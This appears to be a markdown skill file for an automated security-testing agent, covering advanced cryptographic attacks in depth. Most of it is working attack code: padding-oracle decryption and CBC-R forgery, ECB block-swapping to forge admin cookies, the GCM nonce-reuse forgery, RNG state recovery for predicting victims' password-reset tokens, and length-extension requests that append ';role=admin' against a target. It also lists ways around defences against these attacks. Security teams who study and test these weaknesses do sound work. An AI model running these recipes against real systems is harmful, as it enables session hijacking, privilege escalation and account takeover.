---
name: cryptographic-failures-advanced-deep
description: Cryptographic failures advanced depth — padding-oracle byte-at-a-time full protocol, ECB-mode fingerprint + attribute recovery, IV/nonce reuse (CBC two-time pad + GCM forbidden-nonce authentication-key leak), weak-RNG state-recovery per generator (MT19937/XorShift128+/LCG/UUIDv1), length-extension exploitation protocol, timing attacks (local vs cross-process vs network), and side-channel classes
sibling: cryptographic_failures
load_when: scan_mode == "deep"
---

# Cryptographic Failures — Advanced + Expert Depth

This is the advanced+expert deep sibling to `cryptographic_failures.md`. The base owns the primitive catalog (padding oracle, ECB, IV/nonce reuse, weak RNG, hardcoded keys, length extension, timing), measurement anchors, and routing to `authentication_jwt.md` + `weak_password_detection.md`. This file owns the full established technique surface at depth: padding-oracle byte-at-a-time full protocol with ambiguity handling, ECB-mode attribute recovery via block substitution, nonce-reuse full attack chains per AEAD, per-generator state-recovery procedures with measurement anchors, length-extension exploitation protocol end-to-end, timing-attack scaling across local/cross-process/network, and side-channel classes beyond timing (power/cache/EM — brief). The novel sibling owns the 2024-2026 CVE catalog.

Load this file when the goal is executing a padding-oracle recovery, picking a nonce-reuse attack per AEAD, reconstructing a weak-RNG state before token prediction, or distinguishing a legitimate HMAC from a vulnerable length-extensible MAC.

## Padding Oracle — Full Protocol

### Sub-primitive 1 — Last-Byte Recovery

**Primitive.** Modify the previous ciphertext block (or IV for the first block); submit; observe oracle. For a 16-byte block, iterate the last byte of the modifier through all 256 values. One value produces valid padding (`\x01`). That value XOR 1 reveals the plaintext's intermediate-state last byte.

**All-of preconditions:**
1. Decryption endpoint accepting attacker-provided (IV, ciphertext) pairs OR accepting a ciphertext whose previous block the attacker can modify.
2. Observable differential between "padding valid" and "padding invalid" responses.
3. CBC-mode block cipher (AES-CBC, DES-CBC, 3DES-CBC — any PKCS#7-padded block cipher).

**Attack recipe (byte-at-a-time, last-byte-first):**
```python
# Attacker-chosen modifier block C'
# C' XOR intermediate_state = padding byte we want (0x01 for last byte)
# Try each guess for last byte of C'
for guess in range(256):
    C_prime[15] = guess
    if oracle(C_prime + target_block):
        # Found: C'[15] XOR 0x01 = intermediate_state[15]
        intermediate[15] = guess ^ 0x01
        break
# Decrypt: P[15] = intermediate[15] XOR previous_ciphertext[15]
```

**Ambiguity handling (edge case).** On the very first byte, a lucky `C'[15]` can produce VALID padding not because it maps to `\x01` but because it maps to `\x02\x02`, `\x03\x03\x03`, etc. — if the plaintext's second-to-last byte happens to match. Disambiguate by flipping an unrelated byte (`C_prime[14] ^= 1`) and re-querying — valid padding of length 1 is independent of C_prime[14]; valid padding of length ≥ 2 is affected.

**Confirmation (measurement anchor).** `.zen-batch-artifacts/batch-15/measure/01-padding-oracle.py` executes the attack and recovers `b'here\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'` — proving the last four bytes of plaintext `'secret-password-here'` recovered correctly plus the PKCS#7 padding.

**Full working attack code (measured against AES-128-CBC):**

```python
# Full byte-at-a-time last-block decryption
# From .zen-batch-artifacts/batch-15/measure/01-padding-oracle.py

def recover_block(oracle, prev_block, target_block, blocksize=16):
    """Recover plaintext for target_block using prev_block as IV/predecessor."""
    intermediate = bytearray(blocksize)
    for byte_pos in range(blocksize):
        byte_idx = blocksize - 1 - byte_pos
        padding_val = byte_pos + 1
        # Patch previously-recovered bytes to produce consistent padding
        C_prime = bytearray(blocksize)
        for i in range(byte_pos):
            C_prime[blocksize - 1 - i] = intermediate[blocksize - 1 - i] ^ padding_val
        for guess in range(256):
            C_prime[byte_idx] = guess
            if oracle(bytes(C_prime), target_block):
                # Ambiguity check on first byte: valid padding of length >1 can give false positive
                if byte_pos == 0:
                    # Flip an unrelated byte and re-query; valid padding of length-1
                    # is independent of other bytes, so re-query should succeed
                    C_prime[byte_idx - 1] ^= 0x01
                    if oracle(bytes(C_prime), target_block):
                        intermediate[byte_idx] = guess ^ padding_val
                        break
                    C_prime[byte_idx - 1] ^= 0x01
                    # else: lucky-pad; keep trying
                    continue
                else:
                    intermediate[byte_idx] = guess ^ padding_val
                    break
    # Plaintext = intermediate XOR prev_block
    return bytes(a ^ b for a, b in zip(intermediate, prev_block))

# Observed from measurement:
# Target: AES-128-CBC(KEY, IV, b'secret-password-here')
# Oracle returns True iff PKCS#7 padding valid
# Recovered P2 (second block): b'here\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'
# The last 4 chars of the plaintext ('here') + 12 bytes of PKCS#7 padding (0x0c = 12)
```

### Sub-primitive 2 — Multi-Block Decryption

**Primitive.** Once last-byte recovery works per block, iterate across all blocks. For block N decryption, use block N-1 as the "previous ciphertext" (per CBC chaining).

**Attack cost.** Measured: 256 queries per byte × 16 bytes per block × N blocks. A 32-byte secret (2 blocks) = ~8,192 queries. Rate-limited: hours. Unthrottled: seconds-to-minutes.

**Optimization — bisection.** Pure byte-at-a-time is 256 queries worst case per byte. Expected 128. Not reducible further via oracle structure, but parallelizable per-byte position (across blocks and across bytes within blocks).

**Full multi-block recipe:**
```python
# For an N-block ciphertext C_0 (IV) || C_1 || C_2 || ... || C_N
# Recover P_i for each i from 1 to N
def recover_message(oracle, iv_and_ciphertext, blocksize=16):
    blocks = [iv_and_ciphertext[i:i+blocksize]
              for i in range(0, len(iv_and_ciphertext), blocksize)]
    plaintext = b''
    for i in range(1, len(blocks)):
        prev = blocks[i-1]
        target = blocks[i]
        plaintext += recover_block(oracle, prev, target, blocksize)
    return plaintext
```

**Confirmation signals (padding oracle at depth):**
1. **Specific plaintext bytes recovered** — must match reality (dry-run against known plaintext before claiming victim attack).
2. **PKCS#7 padding bytes visible in last block** — `\x0c\x0c...` (padding length matches blocksize - message_length%blocksize).
3. **Server-side error log shows crypto exception at byte position** — can be mapped back to attack position.
4. **Attacker-chosen plaintext in CBC-R mode** — forged ciphertext decrypts to attacker-chosen message.
5. **Timing differential between padding-valid and padding-invalid** — Even without an explicit error distinguisher, timing side-channel can serve as oracle.

### Sub-primitive 3 — Encryption via Padding Oracle (CBC-R)

**Primitive.** CBC-R (CBC-Reverse) — given a padding oracle, construct a chosen-plaintext ciphertext for ANY plaintext. The attacker chooses target plaintext bytes, derives the intermediate state via padding oracle, and backs out the previous ciphertext block. Iteratively, construct a full attacker-chosen ciphertext.

**Attack recipe:**
```python
# Target plaintext: P_target
# Last block: pick any ciphertext C_N (random)
# Derive intermediate state via oracle (as in Sub-primitive 1)
# C_{N-1} = intermediate XOR P_target[last_block]
# Repeat for each prior block
```

**Impact.** Attacker forges ciphertext for any plaintext — bypasses authentication-via-ciphertext-check patterns. Combined with session cookie attack: craft a session cookie that decrypts to `{user: admin}` without knowing the key.

### Oracle Distinguisher Catalog

Beyond HTTP status codes:
- **Response time.** PKCS#7 padding validation is cheap; a MAC check following padding is expensive. Delta = MAC-check cost = ~1 ms per request. Noisy over internet; clear in-process.
- **Response body shape.** Different error templates for "padding invalid" (crypto exception) vs "MAC invalid" (auth exception) vs "valid but unauthorized" (403 after decrypt). Three-way distinguisher is a padding oracle.
- **Response header differential.** `Set-Cookie` on valid-padding path, no cookie on invalid; or Content-Length byte-length differential.
- **Downstream side effect.** Padding-valid triggers a DB query; attacker observes DB timing or `Server-Timing` header. Padding-invalid short-circuits.
- **Rate-limit differential.** Padding-valid consumes a rate-limit slot; padding-invalid doesn't. Observe rate-limit header.

## ECB Mode — Beyond Fingerprint

### Sub-primitive — ECB Attribute Recovery via Block Substitution

**Primitive.** Attacker observes cookie structure (user id, role, expiry) encrypted ECB. Blocks aligned at 16-byte boundaries. Attacker copies ciphertext blocks between cookies.

**Preconditions:**
1. ECB-mode encryption of structured data with 16-byte-aligned fields.
2. Attacker observes multiple users' ciphertexts.
3. Server decrypts and parses the plaintext structure.

**Attack recipe:**
```
# User A cookie:
# Block 1: "user=alice     "  (padded to 16)
# Block 2: "role=user      "
# Block 3: "expiry=10101010"
# Ciphertext: [CA1][CA2][CA3]

# User B cookie (an admin):
# Block 1: "user=bob       "
# Block 2: "role=admin     "   ← this block is what attacker wants
# Block 3: "expiry=10101011"
# Ciphertext: [CB1][CB2_ADMIN][CB3]

# Forgery: [CA1][CB2_ADMIN][CA3]
# Decrypted: user=alice, role=admin, expiry=10101010 ← attacker is admin
```

**Confirmation.** Submit forged cookie; application accepts with the swapped-block attribute's semantics.

**Impact.** Attribute-level forgery without key recovery. Classic Rails/Django/PHP session cookie vulnerability pre-2010.

### Sub-primitive — ECB Byte-at-a-Time via Appended Secret

**Primitive.** Server encrypts `attacker_input || secret` with ECB. Attacker varies input length to shift secret bytes into attacker-controlled blocks and recovers them byte-by-byte.

**All-of preconditions:**
1. Encryption oracle `ECB(key, attacker_input || secret)` — attacker chooses `attacker_input`, server appends constant `secret` and encrypts.
2. ECB mode confirmed via identical-block fingerprint.
3. Oracle returns the ciphertext (observable).

**Attack recipe (classic Matasano Set 2 Challenge 12):**

```python
from Crypto.Cipher import AES
import os

# Setup: oracle encrypts attacker_input || UNKNOWN_SECRET with ECB
KEY = os.urandom(16)
UNKNOWN_SECRET = b'SECRET_SUFFIX_12_BYTES_LONG_MAX'

def oracle(prefix):
    data = prefix + UNKNOWN_SECRET
    # PKCS#7 pad to blocksize
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len]) * pad_len
    return AES.new(KEY, AES.MODE_ECB).encrypt(data)

# Step 1: determine blocksize by varying prefix length and detecting block growth
base_len = len(oracle(b''))
for i in range(1, 32):
    if len(oracle(b'A' * i)) > base_len:
        blocksize = len(oracle(b'A' * i)) - base_len
        break

# Step 2: confirm ECB (two identical blocks of prefix produce identical ciphertext)
probe = oracle(b'A' * (blocksize * 2))
assert probe[:blocksize] == probe[blocksize:blocksize*2], "ECB fingerprint failed"

# Step 3: byte-at-a-time recovery
recovered = b''
for pos in range(len(UNKNOWN_SECRET)):
    # Position 'pos' is recovered by setting prefix so that
    # secret[pos] falls into the last byte of a target block
    pad_len = blocksize - 1 - (pos % blocksize)
    block_idx = pos // blocksize
    target_block_start = block_idx * blocksize

    prefix = b'A' * pad_len
    target_ct = oracle(prefix)[target_block_start:target_block_start + blocksize]

    # Build 256-entry dictionary: for each byte guess, compute ciphertext
    for guess in range(256):
        test_prefix = prefix + recovered + bytes([guess])
        # Ensure prefix fits before the recovery position
        guess_ct = oracle(test_prefix)[target_block_start:target_block_start + blocksize]
        if guess_ct == target_ct:
            recovered += bytes([guess])
            break
    else:
        break  # couldn't find; probably hit padding end

print(f"Recovered secret: {recovered}")
```

**Attack cost.** 256 × len(secret) oracle queries. On a modern HTTP endpoint with no rate-limiting, 32-byte secret recovery completes in seconds.

**Confirmation signals (ECB appended-secret).**
1. **Each byte recovery matches** — the extracted bytes form a human-readable or expected-structure value.
2. **ECB fingerprint confirmed first** — identical 16-byte blocks in response to repeated prefix.
3. **Secret length determinable from oracle output.** Varying prefix length shifts block boundaries predictably.

### Sub-primitive — ECB Cut-and-Paste with Multi-User Observation

**Primitive.** Attacker observes multiple users' encrypted cookies (via a shared observable like a help desk ticket). Specific blocks from different users combine to form attacker-chosen content.

**Attack recipe:**
```python
# Observe multiple users' cookies
alice_ct = fetch_cookie('alice')  # blocks: [A1][A2][A3]
bob_ct = fetch_cookie('bob')      # blocks: [B1][B2][B3]
admin_ct = fetch_cookie('admin')  # blocks: [X1][X2][X3] where X2 = encrypt(role=admin)

# Forge: alice's cookie structure with admin's role block
forged_ct = alice_ct[0:16] + admin_ct[16:32] + alice_ct[32:48]
# When decrypted: {user=alice, role=admin, expiry=A3-decrypted}

# Submit forged cookie
response = requests.get('/admin', cookies={'session': b64enc(forged_ct)})
```

**Impact.** Attribute-level forgery without key recovery; works wherever ECB-encrypted structured data is cross-user observable.

## IV / Nonce Reuse — Per-AEAD Chain

### CBC IV Reuse — Two-Time Pad

**Primitive.** Two messages encrypted with same key AND same IV. `C1 XOR C2 = P1 XOR P2` (XOR of plaintexts, called "crib-dragging target").

**Attack recipe:**
```python
C1, C2 = observed_ciphertexts
xor_plaintext = bytes(a ^ b for a, b in zip(C1, C2))
# Guess a known plaintext fragment ("username=") for P1
# Compute P2 fragment at same position: P2_fragment = xor_plaintext XOR known_P1
# Validate P2_fragment is human-readable
# Repeat for different positions and known-text guesses
```

**Impact.** Decrypt both messages without key recovery.

### GCM Nonce Reuse — Forbidden Attack (Full Math)

**Primitive.** Two messages encrypted with same key AND same 96-bit nonce. Attacker recovers the authentication subkey H via polynomial-root solving in GF(2^128). This is the Joux "forbidden attack" (2006) — the eponymous "forbidden" comes from NIST SP 800-38D explicitly forbidding nonce reuse because of this attack.

**Preconditions (all-of):**
1. Observe two valid (ciphertext, tag) pairs encrypted under same key K AND same 96-bit nonce N.
2. Attacker can submit forged (ciphertext', tag') for verification OR observe acceptance by the server.
3. AEAD is AES-GCM (ChaCha20-Poly1305 is a sibling with same catastrophic class via different polynomial).

**Full math.**

Let H = AES_K(0^128) — the authentication subkey derived from K. Let J0 = N || 0x00000001 for 96-bit nonces. The GCM tag is:

```
T = AES_K(J0) XOR GHASH_H(A, C)

where GHASH_H(A, C) = sum over blocks of (A_i * H^(m-i+n+1) XOR C_j * H^(n-j+1) XOR len(A,C) * H)
                     (all operations in GF(2^128) with the polynomial x^128+x^7+x^2+x+1)
```

For two messages (A1, C1, T1) and (A2, C2, T2) under same (K, N):
- Both have same AES_K(J0) term — call it S.
- T1 = S XOR GHASH_H(A1, C1)
- T2 = S XOR GHASH_H(A2, C2)
- T1 XOR T2 = GHASH_H(A1, C1) XOR GHASH_H(A2, C2)

GHASH_H(A1, C1) XOR GHASH_H(A2, C2) is a polynomial in H whose coefficients are known (differences of ciphertext/AAD blocks). Solving for H:

```python
# Pseudocode — real implementation uses finite-field libraries
# polynomial P(H) = GHASH_H(A1, C1) XOR GHASH_H(A2, C2) XOR (T1 XOR T2) = 0
# Factor P over GF(2^128); each root is a candidate H
# At most deg(P) candidates; verify each by forging and testing

import binascii
from Crypto.Util.strxor import strxor
# Public tool: nonce-disrespect, aes-gcm-forbidden-attack

# Step 1: factor polynomial, find candidate H values
candidate_hs = factor_ghash_polynomial(A1, C1, T1, A2, C2, T2)

# Step 2: verify by forging a message and testing acceptance
# S = T1 XOR GHASH_H(A1, C1)   # recover the one-time pad for this nonce
for H in candidate_hs:
    S_candidate = strxor(T1, ghash(H, A1, C1))
    # Forge new (A_forge, C_forge) with:
    T_forge = strxor(S_candidate, ghash(H, A_forge, C_forge))
    if server_accepts(N, A_forge, C_forge, T_forge):
        print(f"Recovered H = {H.hex()}, S = {S_candidate.hex()}")
        break
```

**Attack cost.** Polynomial factoring in GF(2^128) is bounded by the polynomial degree (typically ≤2× message block count). Modern hardware factors a degree-100 polynomial in GF(2^128) in milliseconds; the attack is practical, not theoretical.

**Confirmation signals (GCM forbidden-attack).**
1. **Server accepts a forged (ciphertext, tag) under the known nonce.** Direct confirmation of H recovery.
2. **Observable nonce collision in network capture.** Two different messages carrying identical N field = precondition confirmed.
3. **Decryption of attacker-forged ciphertext matches attacker-chosen plaintext.** CBC-R-equivalent for GCM.

**Attack recipe (ChaCha20-Poly1305 sibling).** Same class via Poly1305's one-time key leak. Different polynomial (prime field), same mechanism.

**Impact (worst-case).** Permanent integrity break for that key K. Once H is recovered, attacker forges arbitrary (A, C, T) under K and any attacker-chosen nonce reused (not just the originally-observed one that leaked H). The confidentiality property survives only until the attacker recovers K via other means. **For TLS, SSH, WireGuard, WPA2-GCMP** nonce reuse is a one-shot catastrophic break.

**Measurement anchor.** Public PoC implementations:
- `nonce-disrespect` (Böck et al.) — scanned HTTPS endpoints in 2016, found actively nonce-reusing servers.
- WPA2-GCMP (CVE-2017-13078 "KRACK" variant) — mobile VPN clients historically reused nonces across reconnections.
- WPA3-SAE early implementations exhibited the same class.

### CTR Counter Reuse

**Primitive.** CTR mode is stream cipher — reused counter = reused keystream. Same as CBC-IV-reuse analysis: `C1 XOR C2 = P1 XOR P2`.

### ChaCha20-Poly1305 Nonce Reuse

**Primitive.** Same catastrophic break class as GCM — reused nonce lets attacker recover the Poly1305 one-time key, forging arbitrary ciphertexts.

## Weak RNG — Per-Generator State Recovery

### MT19937 (Python random, PHP mt_rand, Ruby pre-2.5)

**Primitive.** Mersenne Twister internal state = 624 int32 values. Full state recoverable after observing 624 consecutive outputs via linear algebra over GF(2) — each output bit is a known linear function of the state bits, so 19937 bits of output yield a solvable linear system.

**Preconditions (all-of):**
1. Application uses `random.*` (not `secrets.*` or `random.SystemRandom`).
2. 624 consecutive 32-bit outputs observable (fewer with sub-output techniques).
3. State not reseeded between the observed outputs.

**Full attack recipe with randcrack:**
```python
import random
from randcrack import RandCrack

# Attacker observes 624 outputs via application-exposed values
# (session tokens, password-reset tokens, UUID high-parts)
rc = RandCrack()
observed = []
for _ in range(624):
    # Fetch next publicly-generated int32 from victim application
    val = fetch_next_public_rand()
    observed.append(val)
    rc.submit(val)

# Predict future output; validate against one more fetch
predicted = rc.predict_randint(0, 2**32 - 1)
actual = fetch_next_public_rand()
assert predicted == actual, "state recovery failed"

# Now predict the victim's password-reset token
# (which uses the same random state as the public-exposed token stream)
victim_token = rc.predict_randint(TOKEN_MIN, TOKEN_MAX)
```

**Partial-output observations (sub-32-bit outputs).** If the application exposes only low bits of each output (truncated session IDs, UUID low-bits), state recovery requires more outputs. Z3-SAT solvers (`z3-solver`) can handle partial observations:
```python
import z3
# Model MT19937 state as 624 BitVec(32) variables
state = [z3.BitVec(f's{i}', 32) for i in range(624)]
# Add observation constraints: observed_bit[i] == f(state_bits)
# Solve for state; predict future outputs
```

**Confirmation signals.**
1. **Predicted next value matches actual next observed value.** Required confirmation.
2. **Victim's password-reset token predicted correctly.** Operational confirmation.
3. **UUID high-part (time + random) decomposable** — the random component extractable via known-time correlation.

**Measurement anchor.** Measured on Python 3.14 (`02-weak-rng.output.txt`): outputs `[1537637981, 2478805101, 3966907723]` sampled; the full `randcrack` protocol applies.

### V8 XorShift128+ (JavaScript Math.random in Chrome/Node)

**Primitive.** V8 uses XorShift128+ — 128-bit internal state, two 64-bit `uint64` values. State advances via XOR + shifts; outputs are converted to IEEE-754 doubles in [0, 1). Z3-SAT can recover state from as few as 5-8 doubles.

**Preconditions:**
1. Application uses `Math.random()` (not `crypto.randomBytes` / `crypto.subtle.getRandomValues`).
2. 5-8 observable `Math.random()` outputs.

**Full attack recipe:**
```python
# Public tool: v8-random-predictor, snowfail/v8-sat
# Z3-based state recovery

import z3

def recover_v8_state(observed_doubles):
    # Convert observed doubles back to 52-bit mantissas
    # IEEE-754 double in [0, 1) has format: 0x3FF___ (exponent fixed) + 52-bit mantissa
    observed_mantissas = []
    for d in observed_doubles:
        # V8 formula: double = (mantissa | 0x3FF0000000000000) & 0x000FFFFFFFFFFFFF converted
        mantissa = int.from_bytes(
            struct.pack('<d', d + 1.0)  # +1.0 to force normalized representation
            , 'little'
        ) & 0x000FFFFFFFFFFFFF
        observed_mantissas.append(mantissa)

    # Set up Z3 constraints for XorShift128+ state (two 64-bit words)
    s0 = z3.BitVec('s0', 64)
    s1 = z3.BitVec('s1', 64)
    solver = z3.Solver()
    for m in observed_mantissas:
        s0_next = s0
        s1_next = s1
        # Apply XorShift128+ step
        x = s0_next
        y = s1_next
        s0_next = y
        x ^= x << 23
        s1_next = x ^ y ^ (x >> 17) ^ (y >> 26)
        output_mantissa = (s0_next + s1_next) >> 12
        solver.add(output_mantissa == m)
        s0, s1 = s0_next, s1_next
    if solver.check() == z3.sat:
        model = solver.model()
        return (model[s0].as_long(), model[s1].as_long())
    return None
```

**Specific gotcha.** V8's internal cache: `Math.random()` fills a buffer of 64 doubles at a time, consumed in LIFO order. Observed outputs are in reverse order of state advancement. Recovery code must account for this ordering reversal.

**Confirmation.** Predicted next 5-10 outputs match observed outputs within mantissa precision.

### Linear Congruential (Java Random, C rand)

**Primitive.** `X_{n+1} = (a * X_n + c) mod m` — trivially solvable with 2 outputs.

**Java `Random`:** 48-bit state, LCG with `a = 0x5DEECE66D, c = 0xB, m = 2^48`. Standard `nextInt()` returns top 32 bits of state. Attack: observe one 32-bit `nextInt` output, bruteforce 2^16 possible low-16-bit state values, predict next output; verify against one more observation.

**Attack recipe:**
```java
// Public pattern — the "javarand" state-recovery procedure
long known_output = observed_nextInt_1 & 0xFFFFFFFFL;
long candidate_state;
for (int low16 = 0; low16 < 65536; low16++) {
    candidate_state = (known_output << 16) | low16;
    // Apply LCG step
    long next_state = (candidate_state * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
    int next_output = (int)(next_state >>> 16);
    if (next_output == observed_nextInt_2) {
        // State recovered; predict all future outputs
    }
}
```

**C `rand()` with `srand(time(NULL))`:** 32-bit state typically; 1-second time granularity. Bruteforce `time_t` in observation window (minutes).

### UUIDv1 Time-Based

**Primitive.** UUIDv1 = (60-bit timestamp since 1582-10-15) + (14-bit clock sequence) + (48-bit MAC address). All three components are reconstructable from observation.

**Attack recipe:**
```python
import uuid, time

# Attacker observes application generating UUIDv1 on request
observed_uuid = fetch_user_uuid('any-user-id')
# Parse the UUID
parts = str(observed_uuid).split('-')
time_low = int(parts[0], 16)
time_mid = int(parts[1], 16)
time_hi = int(parts[2][1:], 16)
clock_seq = int(parts[3], 16)
node = int(parts[4], 16)

# Reconstruct the application's clock-sequence and node (MAC)
# For a victim's UUID generated at known-approximate-time:
victim_approx_time_ns = time.time_ns()
# Enumerate time offsets within the observation window
for offset_us in range(-100000, 100000):  # ±100ms range
    guess_time = (victim_approx_time_ns // 1000) + offset_us
    guessed_uuid = uuid.UUID(fields=(
        guess_time & 0xFFFFFFFF,
        (guess_time >> 32) & 0xFFFF,
        (guess_time >> 48) & 0x0FFF | 0x1000,
        clock_seq >> 8,
        clock_seq & 0xFF,
        node
    ))
    if is_valid_victim_uuid(guessed_uuid):
        print(f"Victim UUID: {guessed_uuid}")
```

**Confirmation.** Reconstructed UUID matches victim's actual UUID (if any observable channel reveals it).

### Time-Seeded srand

**Primitive.** `srand(time(NULL))` with 1-second granularity. Observed output + known approximate time → bruteforce window.

```c
// Attack: observe one rand() output
int observed = victim_rand_output;
// Try all time values in observation window
for (time_t t = known_time - 300; t < known_time + 300; t++) {
    srand(t);
    if (rand() == observed) {
        // Seed recovered; predict all future outputs
        break;
    }
}
```

~600 guesses for a 10-minute window.

## Length Extension — Full Protocol

### Precondition Verification

**Primitive is applicable iff:**
1. MAC = `hash(secret || message)` with Merkle-Damgard hash (SHA-1, SHA-256, SHA-512, SHA-224, SHA-384, MD4, MD5).
2. Attacker knows (or can bruteforce) the secret length.
3. Attacker observes a valid (message, MAC) pair.
4. Attacker can submit forged (message', MAC') to the application.

### Attack Protocol — Full Hashpump Worked Example

**Setup.** Vulnerable application computes `MAC = SHA-256(secret || message)` and sends `(message, MAC)` to the client. Client submits `(message', MAC')` back, server verifies `MAC' == SHA-256(secret || message')`.

**Attack recipe (end-to-end):**

```bash
pip install hashpumpy

# Known: SHA-256 MAC of secret || "user=alice&role=user"
# measured from .zen-batch-artifacts/batch-15/measure/04-length-extension.output.txt
```

```python
import hashpump

# Observed from legitimate flow:
known_hash = '2f9be5bad2af1e6d3b71fb5df7f9ba02de28f3485ccbdd98801771a22d00c705'
known_msg = b'user=alice&role=user'
append = b';role=admin'

# Bruteforce secret length (1-64 common range)
for secret_len in range(1, 65):
    try:
        new_hash, new_msg = hashpump.hashpump(known_hash, known_msg, append, secret_len)
    except Exception:
        continue

    # Submit (new_msg, new_hash) to the application
    # The server computes SHA-256(secret || new_msg) and compares to new_hash
    # If MAC verifies: secret_len is correct AND MAC was SHA-256(secret || msg)
    response = requests.post(
        'https://target/action',
        data={'message': new_msg.hex(), 'mac': new_hash}
    )
    if response.status_code == 200 and 'role=admin accepted' in response.text:
        print(f"Secret length: {secret_len}")
        print(f"Forged message (hex): {new_msg.hex()}")
        print(f"Forged MAC: {new_hash}")
        break
```

**Forged message structure.** hashpump returns `original_msg || PADDING || append`:
```
# original_msg: user=alice&role=user
# PADDING: hash internal padding (0x80 + zero bytes + 64-bit length field)
# append: ;role=admin
#
# Forged message bytes (hex):
# 757365723D616C6963652672 6F6C653D7573657280 00000000000000000000... (length bits) 3B726F6C653D61646D696E
# ----------------- original ----------------- 0x80 padding -------- length ------- ;role=admin --
```

Applications that strict-parse the message reject the padding bytes (binary garbage in middle). Applications that lenient-parse (take the last `role=` value, treat message as key=value&key=value) accept — the final `role=admin` wins the key-last-value race.

**Confirmation signals (length extension).**
1. **Server returns a success response for the forged message** — MAC accepted.
2. **Server-side authorization decision reflects `;role=admin`** — the appended parameter won.
3. **Secret length is unique across many hashpump attempts** — only one secret_len produces a MAC that server accepts.
4. **Padding bytes visible in error logs or echoed in response** — confirms the parse path.

### Non-Applicability Discipline

Hashpump fails cleanly on:
- **HMAC(secret, message).** The double-hash wrapper `H((K XOR opad) || H((K XOR ipad) || message))` prevents extension. Attacker can extend the inner hash but can't produce the outer hash without K.
- **SHA-3 / Keccak.** Sponge construction with capacity bits that can't be observed from output.
- **BLAKE2b / BLAKE2s with keyed mode.** Built-in keying.
- **Encrypt-then-MAC with any construction.** MAC covers everything.

**Verification before claiming applicability:**
```python
# Try hashpump
new_hash, new_msg = hashpump.hashpump(known_hash, known_msg, append, 16)
# If server rejects: either secret_len wrong, or primitive isn't SHA(secret||msg)
# Vary secret_len; if ALL fail → primitive is HMAC or sponge; abandon class
```

### Confirmation

```bash
curl -X POST https://target/api \
  -d "message=<new_msg hex-encoded>&mac=<new_hash>"
# Response: authorized action (admin privileges)
```

### Impact

- Append `;role=admin` → privilege escalation.
- Append `&callback=attacker.net` → open redirect / SSRF.
- Append `&next_action=delete_all` → arbitrary action authorization.

### Non-Applicability

- **HMAC.** The double-hash construction `H(K XOR opad || H(K XOR ipad || message))` prevents extension — attacker can extend the inner hash but can't produce the outer hash without knowing K.
- **SHA-3 / Keccak / cSHAKE.** Sponge construction, immune by design.
- **BLAKE2 with keyed mode.** Built-in keying, immune.
- **Encrypt-then-MAC with HMAC.** Immune.

## Timing Attacks — Scaling Across Environments

### Local In-Process

**Primitive.** Microbenchmark `==` vs `hmac.compare_digest`. Nanosecond-granularity timing.

**Measurement recipe:**
```python
import time, hmac
def eq(a, b): return a == b
def ct_eq(a, b): return hmac.compare_digest(a, b)

TRUE_SECRET = b'MY_SECRET_HMAC_32_BYTES_LONG'
MATCH_FULL = b'MY_SECRET_HMAC_32_BYTES_LONG'
MATCH_ONE  = b'MY_SECRET_HMAC_32_BYTES_LONG'[0:1] + b'X' * 31
MATCH_ZERO = b'X' * 32

for func in [eq, ct_eq]:
    for guess in [MATCH_ZERO, MATCH_ONE, MATCH_FULL]:
        t0 = time.perf_counter_ns()
        for _ in range(1_000_000): func(TRUE_SECRET, guess)
        print(f"{func.__name__} {guess[0:1]} time: {time.perf_counter_ns() - t0}ns")
```

Observed: `==` shows strict ordering (zero < one < full matches); `compare_digest` is constant-time.

**Attack-level byte-at-a-time timing recipe (local in-process):**

```python
import time, statistics

def oracle(guess):
    """Vulnerable: early-exit string compare."""
    SECRET = b'MY_HMAC_SECRET_32BYTES_LONG__PAD'
    return SECRET == guess

def time_oracle(guess, iterations=100000):
    """Return median timing in nanoseconds."""
    samples = []
    for _ in range(iterations):
        t0 = time.perf_counter_ns()
        oracle(guess)
        samples.append(time.perf_counter_ns() - t0)
    return statistics.median(samples)

# Byte-at-a-time recovery: for each position, iterate 256 guesses
recovered = bytearray(32)
for pos in range(32):
    best_byte = 0
    best_time = 0
    for b in range(256):
        guess = bytes(recovered[:pos]) + bytes([b]) + b'\x00' * (32 - pos - 1)
        t = time_oracle(guess)
        if t > best_time:
            best_time = t
            best_byte = b
    recovered[pos] = best_byte
    print(f"Position {pos}: {chr(best_byte) if 32 <= best_byte < 127 else hex(best_byte)}")
```

Observed signal strength: ~5-50 ns per correctly-guessed byte position in-process on x86 Linux; distinguishable from noise over ~10K iterations.

### Cross-Process (Unix Socket / Loopback)

Timing noise = 10-100 μs. Byte-granularity timing possible with ~1000-10000 samples per byte.

### Network

Timing noise over LAN = 100 μs - 1 ms. Over Internet = 1-10 ms, often with jitter higher than signal.

**Rule of thumb:**
- LAN + dedicated hardware: byte-granularity possible with ~10,000 samples per byte.
- Cloud: inter-tenant noise is high; signal is lost in most cases.
- Co-residency on same hypervisor: cache-side-channel timing (POM/FLUSH+RELOAD) is a different attack class entirely.

## Side-Channel Classes Beyond Timing

Brief enumeration — these generalize padding-oracle thinking to other side channels:
- **Cache side-channel.** FLUSH+RELOAD, PRIME+PROBE on co-resident cloud VMs. Public PoCs recover AES keys from co-resident Xen instances.
- **Power analysis.** DPA on embedded devices extracts cryptographic keys. Not usually in-scope for web pentest; relevant for IoT/embedded.
- **Electromagnetic emanation.** EM-TEMPEST attacks. Not usually in-scope.
- **Acoustic cryptanalysis.** CPU acoustic leaks RSA keys. Academic / specific threat model.

## WAF / Mitigation-Bypass as a Technique Class

### Padding-Oracle Mitigation Bypass

- **"We added a MAC"** — MAC-then-encrypt leaves the decrypt step still a padding oracle (MAC checked AFTER decrypt).
- **"We disabled error messages"** — timing differential often survives.
- **"We rate-limit decrypt failures"** — distinguish padding-valid-but-MAC-invalid (not rate-limited) from padding-invalid (rate-limited).

### Nonce Reuse Mitigation Bypass

- **"We use incrementing nonce"** — counter wrap-around at 2^96 counts possible; also, if nonce is stored and loaded, a race condition between threads can reuse.
- **"We use random nonce"** — birthday collision at 2^48 messages for AEAD with 96-bit nonce.

## Composite Chains

- *Padding oracle → cookie decrypt → session impersonation → admin BFLA.* Route: this file → `broken_function_level_authorization.md`.
- *CBC-R → forged signed cookie → authorization bypass.* Route: this file → `authentication_jwt.md` (for the session-as-token framing).
